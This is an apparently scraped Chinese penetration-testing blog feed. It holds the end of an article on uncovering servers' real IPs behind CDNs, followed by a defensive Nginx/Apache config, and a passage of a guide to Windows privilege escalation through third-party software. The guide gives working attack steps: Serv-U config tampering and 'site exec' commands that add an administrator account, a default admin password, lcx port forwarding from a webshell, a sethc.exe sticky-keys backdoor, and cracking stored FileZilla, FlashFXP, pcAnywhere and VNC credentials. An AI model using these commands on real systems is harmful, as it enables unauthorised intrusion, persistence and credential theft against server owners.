<p>邮件交换记录 (<strong>MX record</strong>)是域名系统（DNS）中的一种资源记录类型，用于指定负责处理发往收件人域名的邮件服务器</p>
<h5 id="2-查询子域名寻找真实IP"><a href="#2-查询子域名寻找真实IP" class="headerlink" title="2.查询子域名寻找真实IP"></a>2.查询子域名寻找真实IP</h5><p>毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。</p>
<p>下面介绍些常用的子域名查找的方法和工具：</p>
<p>1）微步在线(<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>)</p>
<p>上文提到的微步在线功能强大，黑客只需输入要查找的域名(如baidu.com)，点击子域名选项就可以查找它的子域名了，但是免费用户每月只有5次免费查询机会。如图：</p>
<p><img src="/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/1058583-20181009230922994-1826758810%5B1%5D.png" alt></p>
<p>2）Dnsdb查询法。(<a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>)</p>
<p>黑客只需输入baidu.com type:A就能收集百度的子域名和ip了。如图：<br> <img src="/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/QQ%E6%88%AA%E5%9B%BE20200427094630.png" alt></p>
<p>3）Google 搜索</p>
<p>Google site:baidu.com -www就能查看除www外的子域名，如图：</p>
<p><img src="/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/QQ%E6%88%AA%E5%9B%BE20200427095533.png" alt></p>
<p>4）各种子域名扫描器</p>
<p>这里，主要为大家推荐子域名挖掘机和lijiejie的subdomainbrute(<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a>)</p>
<p>子域名挖掘机仅需输入域名即可基于字典挖掘它的子域名，如图：</p>
<p><img src="/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/1058583-20181009231018377-2070670991%5B1%5D.png" alt></p>
<p>Subdomainbrute以windows为例，黑客仅需打开cmd进入它所在的目录输入</p>
<p><code>Python subdomainbrute.py baidu.com --full</code></p>
<p>即可收集百度的子域名，如图：</p>
<p><img src="/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/1058583-20181009231030794-1664451845%5B1%5D.png" alt></p>
<p>注：收集子域名后尝试以解析ip不在cdn上的ip解析主站，真实ip成功被获取到。</p>
<h5 id="3：网络空间引擎搜索法"><a href="#3：网络空间引擎搜索法" class="headerlink" title="3：网络空间引擎搜索法"></a>3：网络空间引擎搜索法</h5><p>常见的有以前的钟馗之眼，<a href="https://www.shodan.io/" target="_blank" rel="noopener">shodan</a>，<a href="https://fofa.so/" target="_blank" rel="noopener">fofa搜索</a>。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip，如图：</p>
<p> <img src="/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/1058583-20181009231044976-1731199101%5B1%5D.png" alt></p>
<h5 id="4-利用SSL证书寻找真实原始IP"><a href="#4-利用SSL证书寻找真实原始IP" class="headerlink" title="4:利用SSL证书寻找真实原始IP"></a>4:利用SSL证书寻找真实原始IP</h5><p><strong>SSL证书</strong></p>
<p>​        SSL证书是<a href="https://baike.baidu.com/item/数字证书/326874" target="_blank" rel="noopener">数字证书</a>的一种，类似于驾驶证、护照和营业执照的电子副本。因为配置在服务器上，也称为SSL服务器证书。SSL 证书就是遵守 SSL协议，由受信任的数字证书颁发机构CA，在验证服务器身份后颁发，具有服务器身份验证和数据传输加密功能。</p>
<p>​        以CloudFlare这款CDN加速器举例：假如你在 abc.com 上托管了一个服务，原始服务器IP是136.23.63.44。 而CloudFlare则会为你提供DDoS保护，Web应用程序防火墙和其他一些安全服务，以保护你的服务免受攻击。</p>
<p>​        为此，你的Web服务器就必须支持SSL并具有证书，此时CloudFlare与你的服务器之间的通信，就像你和CloudFlare之间的通信一样，会被加密（即没有灵活的SSL存在）。这看起来很安全，但问题是，当你在端口443<code>https://136.23.63.44:443</code>上直接连接到IP时，SSL证书就会被暴露。</p>
<p>​        此时，如果攻击者扫描0.0.0.0/0，即整个互联网，他们就可以在端口443上获取在 aaa.com上的有效证书，进而获取提供给你的Web服务器IP。</p>
<p><a href="https://link.zhihu.com/?target=https%3A//censys.io/certificates/">https://censys.io/certificates/</a> 通过SSL证书查询真实IP（推荐）</p>
<p><strong>Censys证书查询搜索步骤如下：</strong></p>
<p>1、aaa.com 证书的搜索查询参数为：<code>parsed.names：aaa.com</code></p>
<p>只显示有效证书的查询参数为：<code>tags.raw：trusted</code></p>
<p>攻击者可以在Censys上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成。</p>
<p>2、组合后的搜索参数为：<code>parsed.names: aaa.com and tags.raw: trusted</code></p>
<p>3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的“<strong>Explore</strong>”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; <strong>IPv4 Hosts</strong>；</p>
<p>隐藏服务具有SSL证书，要查找它使用的IPv4，只需将”SHA1 fingerprint”（签名证书的sha1值，也就是SHA1指纹）粘贴到Censys平台IPv4主机搜索中，即可找到证书，使用此方法可以轻松找到配置错误的Web服务器真实IP。</p>
<h5 id="方法5-利用HTTP标头寻找真实原始IP"><a href="#方法5-利用HTTP标头寻找真实原始IP" class="headerlink" title="方法5:利用HTTP标头寻找真实原始IP"></a>方法5:利用HTTP标头寻找真实原始IP</h5><p>借助SecurityTrails这样的平台，任何人都可以在茫茫的大数据搜索到自己的目标，甚至可以通过比较HTTP标头来查找到原始服务器。</p>
<p>特别是当用户拥有一个非常特别的服务器名称与软件名称时，攻击者找到你就变得更容易。</p>
<p>如果要搜索的数据相当多，如上所述，攻击者可以在Censys上组合搜索参数。假设你正在与1500个Web服务器共享你的服务器HTTP标头，这些服务器都发送的是相同的标头参数和值的组合。而且你还使用新的PHP框架发送唯一的HTTP标头（例如：X-Generated-Via：XYZ框架），目前约有400名网站管理员使用了该框架。而最终由三个服务器组成的交集，只需手动操作就可以找到了IP，整个过程只需要几秒钟。</p>
<p>例如，Censys上用于匹配服务器标头的搜索参数是80.http.get.headers.server :，查找由CloudFlare提供服务的网站的参数如下</p>
<p>80.http.get.headers.server:cloudflare</p>
<p><img src="/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/1058583-20181009231212219-1764707602%5B1%5D.png" alt></p>
<h5 id="方法6-利用网站返回的内容寻找真实原始IP"><a href="#方法6-利用网站返回的内容寻找真实原始IP" class="headerlink" title="方法6:利用网站返回的内容寻找真实原始IP"></a>方法6:利用网站返回的内容寻找真实原始IP</h5><p>如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。</p>
<p>浏览网站源代码，寻找独特的代码片段。在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics，reCAPTCHA）是攻击者经常使用的方法。</p>
<p>以下是从HackTheBox网站获取的Google Analytics跟踪代码示例：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">ga（'create'，'UA-<span class="number">93577176</span>-1'，'auto'）;</span><br></pre></td></tr></table></figure>

<p>​        可以使用80.http.get.body：参数通过body/source过滤Censys数据，不幸的是，正常的搜索字段有局限性，但你可以在Censys请求研究访问权限，该权限允许你通过Google BigQuery进行更强大的查询。</p>
<p><strong>Shodan</strong></p>
<p>Shodan是一种类似于Censys的服务，也提供了http.html搜索参数。</p>
<h5 id="7-使用国外主机解析域名"><a href="#7-使用国外主机解析域名" class="headerlink" title="7:使用国外主机解析域名"></a>7:使用国外主机解析域名</h5><p>​        国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。</p>
<p>​       我这里通过国外主机nslookup查询国内163.com对应IP。</p>
<p><img src="/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/QQ%E6%88%AA%E5%9B%BE20200427095107.png" alt></p>
<p>我们可以看到只返回了一条对应IP，猜测应该是真实IP。</p>
<p>这里推荐一个国外的多节点ping工具。</p>
<p>域名：<a href="http://www.just-ping.com/" target="_blank" rel="noopener">http://www.just-ping.com/</a></p>
<h5 id="8-网站漏洞查找"><a href="#8-网站漏洞查找" class="headerlink" title="8:网站漏洞查找"></a>8:网站漏洞查找</h5><p>1.目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。</p>
<p> 2.XSS盲打，命令执行反弹shell，SSRF等。可以让服务器主动访问我们预设的web服务器，那么就能在日志里面看见目标网站服务器的真实IP。</p>
<p> 3.无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。</p>
<h5 id="9-网站邮件订阅查找"><a href="#9-网站邮件订阅查找" class="headerlink" title="9:网站邮件订阅查找"></a>9:网站邮件订阅查找</h5><p>RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。</p>
<h4 id="如何防止CDN被绕过？"><a href="#如何防止CDN被绕过？" class="headerlink" title="如何防止CDN被绕过？"></a>如何防止CDN被绕过？</h4><p>通过中间件配置只允许域名访问，禁止ip访问。</p>
<p>这样处理的话，所有直接访问站点真实IP的请求将会被拒绝，任何用户只能通过域名访问站点，通过预先设定的网络链路，从DNS→CDN→waf防护→源站，所有的域名访问请求都必须经过WAF检测。</p>
<h5 id="Nginx参考配置："><a href="#Nginx参考配置：" class="headerlink" title="Nginx参考配置："></a>Nginx参考配置：</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#添加一个server,在原server里绑定域名</span></span><br><span class="line">server  &#123;</span><br><span class="line">        listen 80 default;</span><br><span class="line">        server_name _;</span><br><span class="line">        return 403;</span><br><span class="line">    &#125;</span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  www.demo.com;</span><br><span class="line">        <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</span><br></pre></td></tr></table></figure>

<h5 id="Apache参考配置"><a href="#Apache参考配置" class="headerlink" title="Apache参考配置:"></a>Apache参考配置:</h5><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在httpd.conf最后面加上</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;VirtualHost 此处填写IP&gt;</span></span><br><span class="line">        <span class="attribute"><span class="nomarkup">ServerName</span></span> 此处填写IP</span><br><span class="line">        <span class="section">&lt;Location /&gt;</span></span><br><span class="line">            <span class="attribute"><span class="nomarkup">Order</span></span> Allow,Deny</span><br><span class="line">            <span class="attribute"><span class="nomarkup">Deny</span></span> from <span class="literal">all</span></span><br><span class="line">        <span class="section">&lt;/Location&gt;</span></span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;VirtualHost 此处填写IP&gt;</span></span><br><span class="line">        <span class="attribute"><span class="nomarkup">DocumentRoot</span></span> /var/www/html</span><br><span class="line">        <span class="attribute"><span class="nomarkup">ServerName</span></span>   此处填写域名</span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure>



<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://zhuanlan.zhihu.com/p/116026247" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/116026247</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/107294740" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/107294740</a></p>
<p><a href="https://www.fujieace.com/penetration-test/cdn-find-ip.html" target="_blank" rel="noopener">https://www.fujieace.com/penetration-test/cdn-find-ip.html</a></p>
<p><a href="https://forum.90sec.com/t/topic/524" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/524</a></p>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>绕过CDN</tag>
      </tags>
  </entry>
  <entry>
    <title>windows中常见提权方式总结(三)</title>
    <url>/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-san/</url>
    <content><![CDATA[<h2 id="提权之第三方软件提权总结"><a href="#提权之第三方软件提权总结" class="headerlink" title="提权之第三方软件提权总结"></a>提权之第三方软件提权总结</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>此文主要记录一些通过第三方软件提权的方式，主要包括一些ftp管理软件，远程管理软件等等。。。</p>
<h4 id="第三方软件serv-u提权"><a href="#第三方软件serv-u提权" class="headerlink" title="第三方软件serv-u提权"></a>第三方软件serv-u提权</h4><h5 id="serv-u简介"><a href="#serv-u简介" class="headerlink" title="serv-u简介"></a>serv-u简介</h5><ul>
<li>Serv-U FTP Server，是一种被广泛运用的FTP服务器端软件，支持3x/9x/ME/NT/2K等全Windows系列。可以设定多个FTP服务器、限定登录用户的权限、登录主目录及空间大小等</li>
<li>serv-u默认安装目录:C:\Program Files\rhinosoft.com\serv-U</li>
<li>serv-u密码文件：ServUDaemon.ini</li>
<li>端口号：默认端口是43958<br>ServUDaemon.ini中lccalsetuportNo=端口</li>
</ul>
<h5 id="FTP提权方法"><a href="#FTP提权方法" class="headerlink" title="FTP提权方法"></a>FTP提权方法</h5><p>1、有修改权限</p>
<p>2、无权限修改</p>
<p>3、serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</p>
<p>4、serv-u ftp转发端口</p>
<h5 id="有修改权限"><a href="#有修改权限" class="headerlink" title="有修改权限"></a>有修改权限</h5><p>步骤如下：<br>1、判断是否安装serv-u<br>nmap扫端口确认<br>2、检查是否有可写权限<br>一般安装目录 c:\Program Files\Serv-u\SerUDaemon.ini<br>3、在serv-u中添加用户<br>在user4=添加一个系统用户</p>
<figure class="highlight protobuf"><table><tr><td class="code"><pre><span class="line">[USER=quan|<span class="number">1</span>]                                <span class="comment">//用户名</span></span><br><span class="line">Password=					    <span class="comment">//用户密码加密后的密文</span></span><br><span class="line">HomeDir=c:\ftp\quan             <span class="comment">//目录</span></span><br><span class="line">RelPaths=<span class="number">3</span> </span><br><span class="line">TimeOut=<span class="number">600</span>                      <span class="comment">//超时时间设置</span></span><br><span class="line">Maintenance=System               <span class="comment">//权限</span></span><br><span class="line">Access1=C:\|RWAMELCDP            <span class="comment">//可访问的目录及权限</span></span><br><span class="line">Access2=d:\|RWAMELCDP            <span class="comment">//可访问的目录及权限</span></span><br><span class="line">Access3=e:\|RWAMELCDP            <span class="comment">//可访问的目录及权限</span></span><br><span class="line">SKEYValues=</span><br></pre></td></tr></table></figure>

<p>password=2位随机字符+md5(2位随机字符+123456)</p>
<p>4、连接目标FTP服务器</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">ftp</span> 目标<span class="built_in">IP</span>地址 刚添加的用户密码</span><br></pre></td></tr></table></figure>

<p>5、利用ftp命令<code>quote site exec</code>添加用户加入administrators权限组</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">quote site exec net<span class="built_in"> user </span>quan quan123 /add</span><br><span class="line">quote site exec net localgroup administrators quan /add</span><br></pre></td></tr></table></figure>

<h5 id="无修改权限"><a href="#无修改权限" class="headerlink" title="无修改权限"></a>无修改权限</h5><p>1、利用md5 直接去解密<br>2、默认用户名密码<br>账户：LocalAdministrator ，密码：#l@$ak#.lk;0@P<br>命令：<br>cmd /c net user quan quan123 /add &amp; net localgroup administrators quan /add<br>3、不是默认密码时<br>直接把SerUAdmin.exe 下载下来<br>用winhex打开查找LocalAdministrator（选择ANSI字符）进行查找密码</p>
<h5 id="serv-u-ftp本地溢出权限提升-使用6-0以及以前版本"><a href="#serv-u-ftp本地溢出权限提升-使用6-0以及以前版本" class="headerlink" title="serv-u ftp本地溢出权限提升(使用6.0以及以前版本)"></a>serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</h5><p>步骤如下：<br>1、用Serv-U提权综合工具生成提权工具serv_u.exe<br>2、先上传 serv_u.exe 到一个盘符下<br>比如是d盘<br>3、执行命令</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">d:\serv_u.exe</span><br><span class="line">d:\serv_u.exe “net<span class="built_in"> user </span>quan quan123 /add”</span><br><span class="line">d:\serv_u.exe “net localgroup administrators quan /add”</span><br></pre></td></tr></table></figure>

<p>注意命令要有引号</p>
<h5 id="serv-u-ftp转发端口"><a href="#serv-u-ftp转发端口" class="headerlink" title="serv-u ftp转发端口"></a>serv-u ftp转发端口</h5><p>1、lcx端口转发<br>在目标Webshell上运行LCX命令</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">lcx -slave yourIP <span class="number">5000</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">43958</span></span><br></pre></td></tr></table></figure>

<p>在本机上运行</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">lcx -<span class="section">listen</span> <span class="number">5000</span> <span class="number">21</span></span><br></pre></td></tr></table></figure>

<p>2、本机登陆Serv_U<br>打开本地的SERV_U 在IP上填入127.0.0.1<br>帐号写LocalAdministrator 密码#l@$ak#.lk;0@P</p>
<p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99692269" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99692269</a></p>
<p>这里就不写具体过程了</p>
<h4 id="第三方软件G6-FTP提权"><a href="#第三方软件G6-FTP提权" class="headerlink" title="第三方软件G6-FTP提权"></a>第三方软件G6-FTP提权</h4><p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-san/QQ%E6%88%AA%E5%9B%BE20200429095652.png" alt></p>
<h5 id="G6-FTP简介"><a href="#G6-FTP简介" class="headerlink" title="G6-FTP简介"></a>G6-FTP简介</h5><ul>
<li>G6 FTP Server 新一代的 FTP 服务器端软件，支持 RFC-959 标准并增强其中的某些功能，上传和下载都可以续传，实时查看运行状态，占用带宽，还有很多功能。</li>
<li>G6-FTP的默认端口为<code>8021</code>，只侦听在127.0.0.1的8021端口上，所以无法从外部直接访问，需要进行端口转发（使用lcx 工具（lcx 具有三个功能：监听、转发、端口转向））。</li>
</ul>
<h5 id="提权关键"><a href="#提权关键" class="headerlink" title="提权关键"></a>提权关键</h5><p>使用lcx时必须保证两个前提，肉鸡A和内网机C都能够访问到外网机B；listen监听的端口之前不能被其它程序占用。</p>
<h5 id="提取方法"><a href="#提取方法" class="headerlink" title="提取方法"></a>提取方法</h5><p>1、通过执行bat文件提权<br>2、通过映射bat文件提权</p>
<h5 id="通过执行bat文件提权"><a href="#通过执行bat文件提权" class="headerlink" title="通过执行bat文件提权"></a>通过执行bat文件提权</h5><p>步骤如下</p>
<ul>
<li><p>下载配置文件<code>Remote.ini</code>，将<code>administrator</code>管理密码解密<br>用cmd5 破解</p>
</li>
<li><p>查找该网站的可读可写目录，然后上传<code>cmd.exe</code>和<code>lcx.exe</code>到该目录下</p>
</li>
<li><p>利用<code>lcx</code>端口转发 默认只允许本机连接</p>
</li>
</ul>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">lcx.exe -tran <span class="number">8027</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8021</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>以管理员用户登录服务端<br>转发成功后，通过<code>G6-FTP</code>软件进行连接，以管理员用户登入</p>
</li>
<li><p>创建FTP用户并进行权限设置</p>
</li>
<li><p>上传批处理文件<br><code>adduser.bat</code>中的文件内容为：即新建一个用户名为<code>quan</code>的用户，并且加入到管理员组中。</p>
</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">net<span class="built_in"> user </span>quan quan123 /add</span><br><span class="line">net localgroup administrators quan /add</span><br></pre></td></tr></table></figure>

<ul>
<li><p>在G6-FTP软件中加入批处理命令<br>site commands-&gt; +<br>Command:ADDUSER<br>Excute:</p>
</li>
<li><p>普通用户登录ftp</p>
</li>
<li><p>执行所加入的批处理命令<br>执行命令<code>quote site adduser.bat</code></p>
</li>
</ul>
<h5 id="通过执行bat文件提权-1"><a href="#通过执行bat文件提权-1" class="headerlink" title="通过执行bat文件提权"></a>通过执行bat文件提权</h5><p>可用性较差<br>步骤如下<br>1、以非特权用户登录<br>2、通过添加FTP用户账户hhh<br>3、对FTP服务器添加新的site命令<br>4、新建a.bat文件</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">net<span class="built_in"> user </span>quan quan123 /add</span><br><span class="line">net localgroup administrators quan /add</span><br></pre></td></tr></table></figure>

<p>5、将a.bat文件映射到新建的site命令</p>
<p>6、获取system权限<br>以test用户登录ftp服务器，执行以下命令<br>ftp&gt;quote site a</p>
<h4 id="第三方软件FileZilla提权"><a href="#第三方软件FileZilla提权" class="headerlink" title="第三方软件FileZilla提权"></a>第三方软件FileZilla提权</h4><h5 id="FileZilla简介"><a href="#FileZilla简介" class="headerlink" title="FileZilla简介"></a>FileZilla简介</h5><ul>
<li>FileZilla是一个免费开源的FTP软件，分为客户端版本和服务器版本，具备所有的FTP软件功能。</li>
<li>FileZilla的默认端口为<code>14147</code>，只侦听在127.0.0.1的14147端口上，所以无法从外部直接访问，需要进行端口转发（使用lcx 工具（lcx 具有三个功能：监听、转发、端口转向））。默认安装目录下有两个敏感文件<code>filezillaserver.xml</code>（包含用户信息）和<code>filezillaserverinterface.xml</code>（包含管理信息）</li>
</ul>
<h5 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h5><p>1、下载这两个文件，拿到管理密码</p>
<p>2、查找该网站的可读可写目录，然后上传<code>cmd.exe</code>和<code>lcx.exe</code>到该目录下</p>
<p>3、利用<code>lcx</code>端口转发 默认只允许本机连接</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">lcx.exe -tran <span class="number">14148</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">14147</span></span><br></pre></td></tr></table></figure>

<p>4、以管理员用户远程登录服务端程序<br>转发成功后，通过<code>FileZilla</code>软件进行连接，以管理员用户登入<br>端口为14148，密码默认为空</p>
<p>5、创建ftp用户并进行权限设置<br>赋予C盘读写权限</p>
<p>6、用刚创建的用户通过FileZilla的客户端登录ftp</p>
<p>7、使用<code>cmd.exe</code>改名为<code>sethc.exe</code>替换<code>C:\Windows\System32\sethc.exe</code>生成shift后门</p>
<p>8、远程登录<code>3389</code>,按<code>5</code>次shift调出<code>cmd.exe</code></p>
<p>9、添加一个用户，并将其提升为管理员权限</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">net<span class="built_in"> user </span>quan 123 /add</span><br><span class="line">net localgroup administrator quan /add</span><br></pre></td></tr></table></figure>

<h5 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h5><p>​     FTP分为主动连接和被动连接，Filezilla的21端口是不能被转发出来的，将21端口转发出来以后，被动连接就会变成主动连接，Filezilla是不支持主动连接的。将21端口转发出来以后就会发生积极拒绝的情况。</p>
<p>​    2008系统权限比2003严格一点，导致系统文件是不能修改和删除重命名，这里是没有办法利用 。如果遇到不能提权的时候，可以使用如下几种提权思路。</p>
<h5 id="扩展知识："><a href="#扩展知识：" class="headerlink" title="扩展知识："></a>扩展知识：</h5><ol>
<li>通过FTP去篡改他桌面上快捷方式，路径指向给修改到我们的恶意程序。（比较被动）不推荐</li>
<li>上传利用到2008启动项 目录里，c:/users/administrator/appdata/roaming/microsoft/windows/start menu/programs/startup/</li>
<li>替换system系统服务程序，进行提权。</li>
</ol>
<h4 id="第三方软件FlashFXP提权"><a href="#第三方软件FlashFXP提权" class="headerlink" title="第三方软件FlashFXP提权"></a>第三方软件FlashFXP提权</h4><p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-san/QQ%E6%88%AA%E5%9B%BE20200429102747.png" alt></p>
<h5 id="1、FlashFXP简介"><a href="#1、FlashFXP简介" class="headerlink" title="1、FlashFXP简介"></a>1、FlashFXP简介</h5><ul>
<li>FlashFXP是一款功能强大的FXP/FTP软件，集成了其它优秀的FTP软件的优点，如CuteFTP的目录比较，支持彩色文字显示；如BpFTP支持多目录选择文件，暂存目录；又如LeapFTP的界面设计。</li>
</ul>
<h5 id="2、提权思路"><a href="#2、提权思路" class="headerlink" title="2、提权思路"></a>2、提权思路</h5><p>利用FlashFXP替换文件漏洞，可以读取管理员链接过的站点账号密码。</p>
<h5 id="3、提权步骤"><a href="#3、提权步骤" class="headerlink" title="3、提权步骤"></a>3、提权步骤</h5><p>（1）下载quick.dat这个文件<br>链接的账号密码都保存在<code>quick.dat</code><br>falshfxp默认安装目录：C:\Program Files\flashfxp</p>
<p>（2）本地覆盖<br>打开我们本机的FlashFTP把原先的文件替换掉</p>
<p>（3）获取网站管理密码<br>打开本机软件，查看历史记录，可以看到受害者主机quick.dat 文件里的服务器、用户名、密码等信息。<br>如果想要获取密码，可下载星号密码查看工具查看暗文</p>
<h4 id="第三方软件pcAnywhere提权"><a href="#第三方软件pcAnywhere提权" class="headerlink" title="第三方软件pcAnywhere提权"></a>第三方软件pcAnywhere提权</h4><h5 id="1、pcAnywhere简介"><a href="#1、pcAnywhere简介" class="headerlink" title="1、pcAnywhere简介"></a>1、pcAnywhere简介</h5><ul>
<li>PcAnywhere是一款远程控制软件，你可以将你的电脑当成主控端去控制远方另一台同样安装有pcANYWHERE的电脑（被控端），你可以使用被控端电脑上的程序或在主控端与被控端之间互传文件。</li>
<li>pcAnywher的默认端口为<code>5631、5632</code>。</li>
<li>pcAnywher的账户和密码保存在一个后缀为<code>.cif</code>的配置文件中,可能是PCA.serven.CIF。</li>
</ul>
<h5 id="2、提权步骤"><a href="#2、提权步骤" class="headerlink" title="2、提权步骤"></a><strong>2、提权步骤</strong></h5><p>（1）访问pcAnywhere默认安装目录，查找<code>cif</code>文件并下载<br>默认路径： C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\Hosts</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">dir</span> <span class="regexp">*.cif</span>/s</span><br></pre></td></tr></table></figure>

<p>（2）利用破解工具<code>pcAnywherePWD</code>对<code>cif</code>文件直接进行破解</p>
<p>（3）连接pcAnywhere服务端<br>拿到用户密码后使用客户端连接对pcAnywhere服务端进行连接，之后就和对本地计算机进行操作一样。</p>
<p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99699638" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99699638</a></p>
<h4 id="第三方软件VNC提权"><a href="#第三方软件VNC提权" class="headerlink" title="第三方软件VNC提权"></a>第三方软件VNC提权</h4><h5 id="VNC简介"><a href="#VNC简介" class="headerlink" title="VNC简介"></a>VNC简介</h5><p>VNC (Virtual Network Console)是虚拟网络控制台的缩写。它 是一款优秀的远程控制工具软件，由著名的 AT&amp;T 的欧洲研究实验室开发的。</p>
<h5 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h5><p>安装VNC后会<code>在注册表中保留VNC的密码</code>，通过WEBSHELL远程读取注册表中的密码信息并在本地破解VNC密码进行远程连接来达到提权目的。</p>
<h5 id="提权步骤-1"><a href="#提权步骤-1" class="headerlink" title="提权步骤"></a>提权步骤</h5><p><strong>1、通过读取注册表十进制数</strong><br>（1）RealVNC的注册表路径：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\R</span>ealVNC<span class="symbol">\W</span>inVNC4<span class="symbol">\P</span>assword</span><br></pre></td></tr></table></figure>

<p>（2）UltraVNC的注册表路径：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\O</span>RL<span class="symbol">\W</span>inVNC3<span class="symbol">\D</span>efault<span class="symbol">\p</span>assword</span><br></pre></td></tr></table></figure>

<p><strong>2、转换成十六进制数</strong><br>在线转换进制地址链接：<a href="https://www.toolfk.com/tool-convert-hexadecimal" target="_blank" rel="noopener">https://www.toolfk.com/tool-convert-hexadecimal</a></p>
<p><strong>3、破解十六进制数得到密码</strong><br>使用工具VNC4X进行破解<br>先在CMD输入<code>vncx4.exe -W</code>回车<br>然后将转换后的十六进制挨个输入，每输入一个都按一次回车</p>
<p><strong>4、使用获取到的账号密码连接vnc</strong><br>通过本地的VNC客户端，连接成功后远程操作实现提权</p>
<p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99711913" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99711913</a></p>
<h4 id="第三方软件Radmin提权"><a href="#第三方软件Radmin提权" class="headerlink" title="第三方软件Radmin提权"></a>第三方软件Radmin提权</h4><h5 id="Radmin简介"><a href="#Radmin简介" class="headerlink" title="Radmin简介"></a>Radmin简介</h5><ul>
<li>Radmin是平时在windows下用的比较多的一个远程管理工具。其具有支持多个连接和IP 过滤(即允许特定的IP控制远程机器)、个性化的档互传、远程关机、支持高分辨率模式、基于Windows NT的安全支持及密码保护以及提供日志文件支持等特性。</li>
<li>默认开放 <code>4899</code>端口</li>
<li>Radmin server2.X、Radmin server3.0都存在一个“致命”漏洞 —— radmin hash提权漏洞</li>
</ul>
